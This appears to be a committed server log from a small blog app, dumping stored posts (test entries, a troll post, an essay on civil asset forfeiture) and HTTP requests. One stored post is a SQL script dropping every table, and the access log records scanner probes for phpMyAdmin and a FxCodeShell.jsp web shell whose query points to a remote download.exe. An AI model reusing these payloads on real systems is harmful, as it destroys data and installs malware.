+    userName: 'Grant_Sucks',
+    userEmail: 'grant@sucks.biz',
+    createdOn: 2019-04-22T02:33:01.810Z,
+    __v: 0 },
+  { _id: 5cbd2db8bae1b279e4edd9fc,
+    blogTitle: 'Issues with Civil Asset Forfeiture',
+    blogText: 'For decades police have been under harsh scrutiny for their behavioral practices. In particular, the practice of civil asset forfeiture has been highly controversial. Civil asset forfeiture is a process where a government law enforcement agency seizes property on the basis that it may be connected to a crime (Crawford 260). Unlike criminal asset forfeiture, civil asset forfeiture is an action filed against property itself and not the owner (Crawford 260). A civil asset forfeiture does not need to be accompanied by criminal charges to the owner and has no other legal implication beyond loss of property (Crawford 258). Civil asset forfeiture started becoming commonplace in America in the 1970s, when Congress passed the Comprehensive Drug Abuse Prevention and Control Act, which gave law enforcement the right to seize drugs and equipment related to its manufacture, storage or distribution (Crawford 261-62). Further legislation expanded seizure powers to include alleged proceeds and real property related to criminal activity (Crawford 262). While those laws are federal, all states have their own forfeiture laws, and the federal laws set a precedent for how forfeitures should be utilized by police. Forfeiture has proved to be an effective tool for law enforcement because it enables them to both seize the proceeds from alleged crimes, as well as seize property that may be used to facilitate crime. However, current civil asset forfeiture laws are fundamentally flawed and need to be revised to protect citizens and prevent abuse.\n\nMany current forfeiture laws provide police with questionable incentives to make seizures of property. Since forfeitures processed through most state laws, as well as those processed under federal law, direct most of the proceeds to law enforcement, there is a serious conflict of interest and the creation of flawed incentives. Law enforcement agencies may become motivated to prioritize cases on the basis of profitability instead of fair application of the law. While state laws do vary, all but eight states give at least 50% of the proceeds from forfeitures to the law enforcement agency, with 26 states giving 100% of the proceeds to law enforcement (Holcomb et al. 277). A 2001 survey of 770 police executives and managers found that “almost forty (40) percent of respondents agreed or strongly agreed to the statement that civil forfeiture is ‘necessary as a budget supplement’” (Holcomb 275). The fact that some police view the income as necessary implies that revenue could be a factor when police are considering making forfeiture actions. For example, “officers from the Volusia County Sheriff’s Office in Florida who stopped vehicles on southbound I-95 […] routinely confiscated any money over one-hundred dollars under the assumption that money in such quantity must be drug money” (Chi 1646). Such actions do little to combat crime and serve little purpose beyond income generation. Volusia officers, as well as many other agencies, would “haggl[e] with the motorists […] allowing the motorists to retain a portion of the money in exchange for an agreement not to contest the forfeiture” in order to make the income more reliable (Chi 1646). In such instances it appears that the law enforcement personnel are primarily motivated by revenue generation in their policing. This conflicts with both the intended purpose of police, to protect and serve, and the ethical standards that police should be held to. Additionally, the ability of police to even partially self-finance can make them less politically accountable to the legislature, who is primarily responsible for their funding. The profitability of civil asset forfeiture inherently creates a conflict of interest and will encourage seizures for the sake of revenue until the incentive is removed.\n\nFurthermore, innocent property can be easily seized in many states that require low burdens of proof to make forfeiture actions. For example, in Massachusetts, the law only requires probable cause to seize assets. The law also enables police to seize “any vehicles, money, or real property used in connection with a controlled substance” (Crawford 265). In essence, the seizure of drug-related property may seem reasonable, but because only probable cause must be provided, the state does not need to prove a connection between the property and a drug transaction (Crawford 264). When establishing probable cause in Massachusetts, prosecutors can use questionable evidence such as “hearsay evidence—which would be inadmissible in a trial— in forfeiture actions” (Crawford 268). Thirteen states require only probable cause to seize assets and only four require assets to be connected to criminal activity beyond a reasonable doubt, which puts many law abiding property owners at risk (Holcomb et al. 278). Considering the undemanding requirements for establishing probable cause, many legal possessions can be considered suspicious and be confiscated. In the court case United States v. $124,700 it was ruled that “‘[p]ossession of a large sum of cash is ‘strong evidence’ of a connection to drug activity’” (qtd. in Moorse 779). The ease with which prosecutors can attain probable cause, using little to no substantial evidence, puts many law abiding people and their property in jeopardy.\n\nForfeiture laws, because they are a civil action against property, rather than a person, have unique procedures that often provide little protection for implicated persons. Rather than having a trial, once the state has started an action against a property, the prosecutor merely submits affidavits that established that the burden of proof is met to justify a seizure (Crawford 265). In 36 states and under federal law, after the property is seized, the burden of proving the innocence of the property is placed solely on the owner (Holcomb et al. 277, Crawford 264). Due to the ‘guilty until proven innocent’ nature of civil forfeiture, paired with often low burdens of proof, many innocent property owners are placed at risk of having their property seized.\n\nHaving wrongfully seized property returned can be a lengthy and potentially expensive process. For example, in 2009, a motel in Massachusetts was seized with probable cause that the owner was involved in criminal activity, on the basis that 15 of the roughly 125,000 patrons served over two decades had been arrested on drug charges (Crawford 257-259). After a three-year legal battle, costing the owners over $100,000, the property was returned; had the case not been taken by a public interest law firm pro bono once the motel owners exhausted their funds, the state would have kept the property. Similarly, the high legal fees associated with contesting a forfeiture are often a barrier preventing property owners from attempting to retain their property. Because the cases are civil in nature, under state laws the property owner does not necessarily have the right to a public defender if they cannot afford a lawyer, as the Sixth Amendment does not apply to non-criminal cases (Crawford 273, 282). As a result forfeiture actions are disproportionately detrimental to indigent parties who will often choose to forgo legal action (Crawford 277-78). Furthermore, law enforcement may choose to specifically choose to target persons who may not have the funds to contest a forfeiture. As in the case of the motel discussed previously, while it was not the only motel where arrests had been made, it was the only one independently owned and operated; consequently it was the only one that saw forfeiture actions taken against it (Crawford 273). This illustrates how the flawed legal process of civil asset forfeiture can victimize property owners and facilitate abuse of forfeiture powers.\n\nThere have been previous attempts to reform civil asset forfeiture. In the 1990s, civil asset forfeiture started to draw large amounts of criticism, both ethically and constitutionally under the First, Fifth, Sixth and Eighth Amendments (Crawford 263). The constitutional challenges failed and the law was upheld; however, legislation would be passed to address the prevalent issues with federal forfeiture laws (Crawford 263). The first reform of federal forfeiture laws came in the Civil Asset Forfeiture Reform Act (CAFRA) in 2000 (Crawford 264). CAFRA would provide for the appointment of legal counsel in cases where a property owner\'s primary residence is in jeopardy, if they request it (Crawford 264). Also, CAFRA rendered the government liable for the property owner’s attorney fees and other expenses from litigation when “the claimant ‘substantially prevails’” (Crawford 264). This would become a massive benefit to law-abiding citizens whose property was wrongly seized, but it provided no benefit to the claimant if the case was lost. In addition, CAFRA increased the burden of proof from probable cause to “preponderance of evidence,” (Crawford 265). Preponderance of evidence is one degree of certainty above probable cause and “implies a ‘more likely than not’ character” (Holcomb et al 277). Raising the burden of proof provided suspected persons and their property with some more protection and made their assets more difficult to seize. While CAFRA did contain valuable reforms, it pertained exclusively to federal laws and in no way addressed forfeiture under state laws, and while it did raise the burden of proof, it still may provide citizens with inadequate protection.',
+    userName: 'Jeep Guy',
+    userEmail: 'nut@tissues.tv',
+    createdOn: 2019-04-22T02:58:00.898Z,
+    __v: 0 } ]
+[0mGET /api/blog [36m304 [0m2.945 ms - -[0m
+[0mGET /w00tw00t.at.blackhats.romanian.anti-sec:) [33m404 [0m0.806 ms - 1395[0m
+[0mGET /phpMyAdmin/scripts/setup.php [33m404 [0m0.791 ms - 1395[0m
+[0mGET /phpmyadmin/scripts/setup.php [33m404 [0m0.780 ms - 1395[0m
+[0mGET /pma/scripts/setup.php [33m404 [0m1.326 ms - 1395[0m
+[0mGET /myadmin/scripts/setup.php [33m404 [0m0.805 ms - 1395[0m
+[0mGET /MyAdmin/scripts/setup.php [33m404 [0m0.970 ms - 1395[0m
+[0mGET / [32m200 [0m0.478 ms - 7433[0m
+[0mHEAD /robots.txt [33m404 [0m0.824 ms - 1395[0m
+[0mPUT /FxCodeShell.jsp%20 [33m404 [0m0.692 ms - 1512[0m
+[0mPUT /FxCodeShell.jsp::$DATA [33m404 [0m0.658 ms - 1512[0m
+[0mPUT /FxCodeShell.jsp/ [33m404 [0m0.649 ms - 1512[0m
+[0mGET /FxCodeShell.jsp?view=FxxkMyLie1836710Aa&os=1&address=http://fid.hognoob.se/download.exe [33m404 [0m1.314 ms - 1395[0m
+[0mHEAD /FxCodeShell.jsp?view=FxxkMyLie1836710Aa&os=1&address=http://fid.hognoob.se/download.exe [33m404 [0m0.827 ms - 1395[0m
+[0mHEAD /FxCodeShell.jsp?view=FxxkMyLie1836710Aa&os=1&address=http://fid.hognoob.se/download.exe [33m404 [0m0.889 ms - 1395[0m
+[0mGET / [32m200 [0m0.503 ms - 7433[0m
+[0mGET /lib/angular-route.min.js [32m200 [0m0.929 ms - 3884[0m
+[0mGET /lib/angular-ui-router.min.js [32m200 [0m0.916 ms - 19546[0m
+[0mGET /blogApp.js [32m200 [0m0.424 ms - 9242[0m
+[0mGET /common/nav/navigation.js [32m200 [0m0.360 ms - 756[0m
+[0mGET /nav/navigation.html [32m200 [0m0.651 ms - 693[0m
+[0mGET /favicon.ico [33m404 [0m0.703 ms - 1395[0m
+[0mGET /favicon.ico [33m404 [0m1.162 ms - 1395[0m
+[0mGET / [36m304 [0m0.377 ms - -[0m
+[0mGET /lib/angular-route.min.js [36m304 [0m0.325 ms - -[0m
+[0mGET /lib/angular-ui-router.min.js [36m304 [0m0.341 ms - -[0m
+[0mGET /blogApp.js [36m304 [0m0.259 ms - -[0m
+[0mGET /common/nav/navigation.js [36m304 [0m0.308 ms - -[0m
+[0mGET /nav/navigation.html [36m304 [0m0.427 ms - -[0m
+[0mGET / [32m200 [0m0.455 ms - 7433[0m
+[0mGET /lib/angular-route.min.js [32m200 [0m0.385 ms - 3884[0m
+[0mGET /lib/angular-ui-router.min.js [32m200 [0m0.397 ms - 19546[0m
+[0mGET /blogApp.js [32m200 [0m0.371 ms - 9242[0m
+[0mGET /common/nav/navigation.js [32m200 [0m0.430 ms - 756[0m
+[0mGET /nav/navigation.html [32m200 [0m0.592 ms - 693[0m
+[0mGET /favicon.ico [33m404 [0m0.745 ms - 1395[0m
+[0mGET /favicon.ico [33m404 [0m0.579 ms - 1395[0m
+Fetching all blog documents
+[ { _id: 5cbd2605d8ae9979972ad23a,
+    blogTitle: 'test',
+    blogText: 'test',
+    userName: 'Grant Hartenstine',
+    userEmail: '1234@gmail.com',
+    createdOn: 2019-04-22T02:25:09.340Z,
+    __v: 0 },
+  { _id: 5cbd2644d8ae9979972ad23b,
+    blogTitle: 'second account',
+    blogText: 'testing',
+    userName: 'Test Account',
+    userEmail: 'test@gmail.com',
+    createdOn: 2019-04-22T02:26:12.210Z,
+    __v: 0 },
+  { _id: 5cbd276dbae1b279e4edd9f6,
+    blogTitle: 'Get a life',
+    blogText: 'You\'re been hackskeepered',
+    userName: 'Anonymous Troll',
+    userEmail: 'troll@gmail.com',
+    createdOn: 2019-04-22T02:31:09.006Z,
+    __v: 0 },
+  { _id: 5cbd27ddbae1b279e4edd9f9,
+    blogTitle: 'hmm',
+    blogText: 'DECLARE @sql NVARCHAR(max)=\'\'\n\nSELECT @sql += \' Drop table \' + QUOTENAME(TABLE_SCHEMA) + \'.\'+ QUOTENAME(TABLE_NAME) + \'; \'\nFROM   INFORMATION_SCHEMA.TABLES\nWHERE  TABLE_TYPE = \'BASE TABLE\'\n\nExec Sp_executesql @sql',
+    userName: 'Jeep Guy',
+    userEmail: 'nut@tissues.tv',
+    createdOn: 2019-04-22T02:33:01.566Z,
+    __v: 0 },
+  { _id: 5cbd27ddbae1b279e4edd9fa,
+    blogTitle: 'My name is Grant',
+    blogText: 'And I suck.',
+    userName: 'Grant_Sucks',
+    userEmail: 'grant@sucks.biz',
+    createdOn: 2019-04-22T02:33:01.810Z,
+    __v: 0 },
+  { _id: 5cbd2db8bae1b279e4edd9fc,
+    blogTitle: 'Issues with Civil Asset Forfeiture',
+    blogText: 'For decades police have been under harsh scrutiny for their behavioral practices. In particular, the practice of civil asset forfeiture has been highly controversial. Civil asset forfeiture is a process where a government law enforcement agency seizes property on the basis that it may be connected to a crime (Crawford 260). Unlike criminal asset forfeiture, civil asset forfeiture is an action filed against property itself and not the owner (Crawford 260). A civil asset forfeiture does not need to be accompanied by criminal charges to the owner and has no other legal implication beyond loss of property (Crawford 258). Civil asset forfeiture started becoming commonplace in America in the 1970s, when Congress passed the Comprehensive Drug Abuse Prevention and Control Act, which gave law enforcement the right to seize drugs and equipment related to its manufacture, storage or distribution (Crawford 261-62). Further legislation expanded seizure powers to include alleged proceeds and real property related to criminal activity (Crawford 262). While those laws are federal, all states have their own forfeiture laws, and the federal laws set a precedent for how forfeitures should be utilized by police. Forfeiture has proved to be an effective tool for law enforcement because it enables them to both seize the proceeds from alleged crimes, as well as seize property that may be used to facilitate crime. However, current civil asset forfeiture laws are fundamentally flawed and need to be revised to protect citizens and prevent abuse.\n\nMany current forfeiture laws provide police with questionable incentives to make seizures of property. Since forfeitures processed through most state laws, as well as those processed under federal law, direct most of the proceeds to law enforcement, there is a serious conflict of interest and the creation of flawed incentives. Law enforcement agencies may become motivated to prioritize cases on the basis of profitability instead of fair application of the law. While state laws do vary, all but eight states give at least 50% of the proceeds from forfeitures to the law enforcement agency, with 26 states giving 100% of the proceeds to law enforcement (Holcomb et al. 277). A 2001 survey of 770 police executives and managers found that “almost forty (40) percent of respondents agreed or strongly agreed to the statement that civil forfeiture is ‘necessary as a budget supplement’” (Holcomb 275). The fact that some police view the income as necessary implies that revenue could be a factor when police are considering making forfeiture actions. For example, “officers from the Volusia County Sheriff’s Office in Florida who stopped vehicles on southbound I-95 […] routinely confiscated any money over one-hundred dollars under the assumption that money in such quantity must be drug money” (Chi 1646). Such actions do little to combat crime and serve little purpose beyond income generation. Volusia officers, as well as many other agencies, would “haggl[e] with the motorists […] allowing the motorists to retain a portion of the money in exchange for an agreement not to contest the forfeiture” in order to make the income more reliable (Chi 1646). In such instances it appears that the law enforcement personnel are primarily motivated by revenue generation in their policing. This conflicts with both the intended purpose of police, to protect and serve, and the ethical standards that police should be held to. Additionally, the ability of police to even partially self-finance can make them less politically accountable to the legislature, who is primarily responsible for their funding. The profitability of civil asset forfeiture inherently creates a conflict of interest and will encourage seizures for the sake of revenue until the incentive is removed.\n\nFurthermore, innocent property can be easily seized in many states that require low burdens of proof to make forfeiture actions. For example, in Massachusetts, the law only requires probable cause to seize assets. The law also enables police to seize “any vehicles, money, or real property used in connection with a controlled substance” (Crawford 265). In essence, the seizure of drug-related property may seem reasonable, but because only probable cause must be provided, the state does not need to prove a connection between the property and a drug transaction (Crawford 264). When establishing probable cause in Massachusetts, prosecutors can use questionable evidence such as “hearsay evidence—which would be inadmissible in a trial— in forfeiture actions” (Crawford 268). Thirteen states require only probable cause to seize assets and only four require assets to be connected to criminal activity beyond a reasonable doubt, which puts many law abiding property owners at risk (Holcomb et al. 278). Considering the undemanding requirements for establishing probable cause, many legal possessions can be considered suspicious and be confiscated. In the court case United States v. $124,700 it was ruled that “‘[p]ossession of a large sum of cash is ‘strong evidence’ of a connection to drug activity’” (qtd. in Moorse 779). The ease with which prosecutors can attain probable cause, using little to no substantial evidence, puts many law abiding people and their property in jeopardy.\n\nForfeiture laws, because they are a civil action against property, rather than a person, have unique procedures that often provide little protection for implicated persons. Rather than having a trial, once the state has started an action against a property, the prosecutor merely submits affidavits that established that the burden of proof is met to justify a seizure (Crawford 265). In 36 states and under federal law, after the property is seized, the burden of proving the innocence of the property is placed solely on the owner (Holcomb et al. 277, Crawford 264). Due to the ‘guilty until proven innocent’ nature of civil forfeiture, paired with often low burdens of proof, many innocent property owners are placed at risk of having their property seized.\n\nHaving wrongfully seized property returned can be a lengthy and potentially expensive process. For example, in 2009, a motel in Massachusetts was seized with probable cause that the owner was involved in criminal activity, on the basis that 15 of the roughly 125,000 patrons served over two decades had been arrested on drug charges (Crawford 257-259). After a three-year legal battle, costing the owners over $100,000, the property was returned; had the case not been taken by a public interest law firm pro bono once the motel owners exhausted their funds, the state would have kept the property. Similarly, the high legal fees associated with contesting a forfeiture are often a barrier preventing property owners from attempting to retain their property. Because the cases are civil in nature, under state laws the property owner does not necessarily have the right to a public defender if they cannot afford a lawyer, as the Sixth Amendment does not apply to non-criminal cases (Crawford 273, 282). As a result forfeiture actions are disproportionately detrimental to indigent parties who will often choose to forgo legal action (Crawford 277-78). Furthermore, law enforcement may choose to specifically choose to target persons who may not have the funds to contest a forfeiture. As in the case of the motel discussed previously, while it was not the only motel where arrests had been made, it was the only one independently owned and operated; consequently it was the only one that saw forfeiture actions taken against it (Crawford 273). This illustrates how the flawed legal process of civil asset forfeiture can victimize property owners and facilitate abuse of forfeiture powers.\n\nThere have been previous attempts to reform civil asset forfeiture. In the 1990s, civil asset forfeiture started to draw large amounts of criticism, both ethically and constitutionally under the First, Fifth, Sixth and Eighth Amendments (Crawford 263). The constitutional challenges failed and the law was upheld; however, legislation would be passed to address the prevalent issues with federal forfeiture laws (Crawford 263). The first reform of federal forfeiture laws came in the Civil Asset Forfeiture Reform Act (CAFRA) in 2000 (Crawford 264). CAFRA would provide for the appointment of legal counsel in cases where a property owner\'s primary residence is in jeopardy, if they request it (Crawford 264). Also, CAFRA rendered the government liable for the property owner’s attorney fees and other expenses from litigation when “the claimant ‘substantially prevails’” (Crawford 264). This would become a massive benefit to law-abiding citizens whose property was wrongly seized, but it provided no benefit to the claimant if the case was lost. In addition, CAFRA increased the burden of proof from probable cause to “preponderance of evidence,” (Crawford 265). Preponderance of evidence is one degree of certainty above probable cause and “implies a ‘more likely than not’ character” (Holcomb et al 277). Raising the burden of proof provided suspected persons and their property with some more protection and made their assets more difficult to seize. While CAFRA did contain valuable reforms, it pertained exclusively to federal laws and in no way addressed forfeiture under state laws, and while it did raise the burden of proof, it still may provide citizens with inadequate protection.',
+    userName: 'Jeep Guy',
+    userEmail: 'nut@tissues.tv',
+    createdOn: 2019-04-22T02:58:00.898Z,
+    __v: 0 } ]
+[0mGET /api/blog [32m200 [0m3.255 ms - 10852[0m
+Fetching all blog documents
+[ { _id: 5cbd2605d8ae9979972ad23a,
+    blogTitle: 'test',
+    blogText: 'test',
+    userName: 'Grant Hartenstine',
+    userEmail: '1234@gmail.com',
+    createdOn: 2019-04-22T02:25:09.340Z,
+    __v: 0 },
+  { _id: 5cbd2644d8ae9979972ad23b,
+    blogTitle: 'second account',
+    blogText: 'testing',
+    userName: 'Test Account',
+    userEmail: 'test@gmail.com',
+    createdOn: 2019-04-22T02:26:12.210Z,
+    __v: 0 },
+  { _id: 5cbd276dbae1b279e4edd9f6,
+    blogTitle: 'Get a life',
+    blogText: 'You\'re been hackskeepered',
+    userName: 'Anonymous Troll',
+    userEmail: 'troll@gmail.com',
+    createdOn: 2019-04-22T02:31:09.006Z,
+    __v: 0 },
+  { _id: 5cbd27ddbae1b279e4edd9f9,
+    blogTitle: 'hmm',
+    blogText: 'DECLARE @sql NVARCHAR(max)=\'\'\n\nSELECT @sql += \' Drop table \' + QUOTENAME(TABLE_SCHEMA) + \'.\'+ QUOTENAME(TABLE_NAME) + \'; \'\nFROM   INFORMATION_SCHEMA.TABLES\nWHERE  TABLE_TYPE = \'BASE TABLE\'\n\nExec Sp_executesql @sql',
+    userName: 'Jeep Guy',
+    userEmail: 'nut@tissues.tv',
+    createdOn: 2019-04-22T02:33:01.566Z,
+    __v: 0 },
+  { _id: 5cbd27ddbae1b279e4edd9fa,
+    blogTitle: 'My name is Grant',
+    blogText: 'And I suck.',
+    userName: 'Grant_Sucks',
+    userEmail: 'grant@sucks.biz',
+    createdOn: 2019-04-22T02:33:01.810Z,
+    __v: 0 },
+  { _id: 5cbd2db8bae1b279e4edd9fc,
+    blogTitle: 'Issues with Civil Asset Forfeiture',
+    blogText: 'For decades police have been under harsh scrutiny for their behavioral practices. In particular, the practice of civil asset forfeiture has been highly controversial. Civil asset forfeiture is a process where a government law enforcement agency seizes property on the basis that it may be connected to a crime (Crawford 260). Unlike criminal asset forfeiture, civil asset forfeiture is an action filed against property itself and not the owner (Crawford 260). A civil asset forfeiture does not need to be accompanied by criminal charges to the owner and has no other legal implication beyond loss of property (Crawford 258). Civil asset forfeiture started becoming commonplace in America in the 1970s, when Congress passed the Comprehensive Drug Abuse Prevention and Control Act, which gave law enforcement the right to seize drugs and equipment related to its manufacture, storage or distribution (Crawford 261-62). Further legislation expanded seizure powers to include alleged proceeds and real property related to criminal activity (Crawford 262). While those laws are federal, all states have their own forfeiture laws, and the federal laws set a precedent for how forfeitures should be utilized by police. Forfeiture has proved to be an effective tool for law enforcement because it enables them to both seize the proceeds from alleged crimes, as well as seize property that may be used to facilitate crime. However, current civil asset forfeiture laws are fundamentally flawed and need to be revised to protect citizens and prevent abuse.\n\nMany current forfeiture laws provide police with questionable incentives to make seizures of property. Since forfeitures processed through most state laws, as well as those processed under federal law, direct most of the proceeds to law enforcement, there is a serious conflict of interest and the creation of flawed incentives. Law enforcement agencies may become motivated to prioritize cases on the basis of profitability instead of fair application of the law. While state laws do vary, all but eight states give at least 50% of the proceeds from forfeitures to the law enforcement agency, with 26 states giving 100% of the proceeds to law enforcement (Holcomb et al. 277). A 2001 survey of 770 police executives and managers found that “almost forty (40) percent of respondents agreed or strongly agreed to the statement that civil forfeiture is ‘necessary as a budget supplement’” (Holcomb 275). The fact that some police view the income as necessary implies that revenue could be a factor when police are considering making forfeiture actions. For example, “officers from the Volusia County Sheriff’s Office in Florida who stopped vehicles on southbound I-95 […] routinely confiscated any money over one-hundred dollars under the assumption that money in such quantity must be drug money” (Chi 1646). Such actions do little to combat crime and serve little purpose beyond income generation. Volusia officers, as well as many other agencies, would “haggl[e] with the motorists […] allowing the motorists to retain a portion of the money in exchange for an agreement not to contest the forfeiture” in order to make the income more reliable (Chi 1646). In such instances it appears that the law enforcement personnel are primarily motivated by revenue generation in their policing. This conflicts with both the intended purpose of police, to protect and serve, and the ethical standards that police should be held to. Additionally, the ability of police to even partially self-finance can make them less politically accountable to the legislature, who is primarily responsible for their funding. The profitability of civil asset forfeiture inherently creates a conflict of interest and will encourage seizures for the sake of revenue until the incentive is removed.\n\nFurthermore, innocent property can be easily seized in many states that require low burdens of proof to make forfeiture actions. For example, in Massachusetts, the law only requires probable cause to seize assets. The law also enables police to seize “any vehicles, money, or real property used in connection with a controlled substance” (Crawford 265). In essence, the seizure of drug-related property may seem reasonable, but because only probable cause must be provided, the state does not need to prove a connection between the property and a drug transaction (Crawford 264). When establishing probable cause in Massachusetts, prosecutors can use questionable evidence such as “hearsay evidence—which would be inadmissible in a trial— in forfeiture actions” (Crawford 268). Thirteen states require only probable cause to seize assets and only four require assets to be connected to criminal activity beyond a reasonable doubt, which puts many law abiding property owners at risk (Holcomb et al. 278). Considering the undemanding requirements for establishing probable cause, many legal possessions can be considered suspicious and be confiscated. In the court case United States v. $124,700 it was ruled that “‘[p]ossession of a large sum of cash is ‘strong evidence’ of a connection to drug activity’” (qtd. in Moorse 779). The ease with which prosecutors can attain probable cause, using little to no substantial evidence, puts many law abiding people and their property in jeopardy.\n\nForfeiture laws, because they are a civil action against property, rather than a person, have unique procedures that often provide little protection for implicated persons. Rather than having a trial, once the state has started an action against a property, the prosecutor merely submits affidavits that established that the burden of proof is met to justify a seizure (Crawford 265). In 36 states and under federal law, after the property is seized, the burden of proving the innocence of the property is placed solely on the owner (Holcomb et al. 277, Crawford 264). Due to the ‘guilty until proven innocent’ nature of civil forfeiture, paired with often low burdens of proof, many innocent property owners are placed at risk of having their property seized.\n\nHaving wrongfully seized property returned can be a lengthy and potentially expensive process. For example, in 2009, a motel in Massachusetts was seized with probable cause that the owner was involved in criminal activity, on the basis that 15 of the roughly 125,000 patrons served over two decades had been arrested on drug charges (Crawford 257-259). After a three-year legal battle, costing the owners over $100,000, the property was returned; had the case not been taken by a public interest law firm pro bono once the motel owners exhausted their funds, the state would have kept the property. Similarly, the high legal fees associated with contesting a forfeiture are often a barrier preventing property owners from attempting to retain their property. Because the cases are civil in nature, under state laws the property owner does not necessarily have the right to a public defender if they cannot afford a lawyer, as the Sixth Amendment does not apply to non-criminal cases (Crawford 273, 282). As a result forfeiture actions are disproportionately detrimental to indigent parties who will often choose to forgo legal action (Crawford 277-78). Furthermore, law enforcement may choose to specifically choose to target persons who may not have the funds to contest a forfeiture. As in the case of the motel discussed previously, while it was not the only motel where arrests had been made, it was the only one independently owned and operated; consequently it was the only one that saw forfeiture actions taken against it (Crawford 273). This illustrates how the flawed legal process of civil asset forfeiture can victimize property owners and facilitate abuse of forfeiture powers.\n\nThere have been previous attempts to reform civil asset forfeiture. In the 1990s, civil asset forfeiture started to draw large amounts of criticism, both ethically and constitutionally under the First, Fifth, Sixth and Eighth Amendments (Crawford 263). The constitutional challenges failed and the law was upheld; however, legislation would be passed to address the prevalent issues with federal forfeiture laws (Crawford 263). The first reform of federal forfeiture laws came in the Civil Asset Forfeiture Reform Act (CAFRA) in 2000 (Crawford 264). CAFRA would provide for the appointment of legal counsel in cases where a property owner\'s primary residence is in jeopardy, if they request it (Crawford 264). Also, CAFRA rendered the government liable for the property owner’s attorney fees and other expenses from litigation when “the claimant ‘substantially prevails’” (Crawford 264). This would become a massive benefit to law-abiding citizens whose property was wrongly seized, but it provided no benefit to the claimant if the case was lost. In addition, CAFRA increased the burden of proof from probable cause to “preponderance of evidence,” (Crawford 265). Preponderance of evidence is one degree of certainty above probable cause and “implies a ‘more likely than not’ character” (Holcomb et al 277). Raising the burden of proof provided suspected persons and their property with some more protection and made their assets more difficult to seize. While CAFRA did contain valuable reforms, it pertained exclusively to federal laws and in no way addressed forfeiture under state laws, and while it did raise the burden of proof, it still may provide citizens with inadequate protection.',
+    userName: 'Jeep Guy',
+    userEmail: 'nut@tissues.tv',
+    createdOn: 2019-04-22T02:58:00.898Z,
+    __v: 0 } ]
+[0mGET /api/blog [36m304 [0m2.990 ms - -[0m
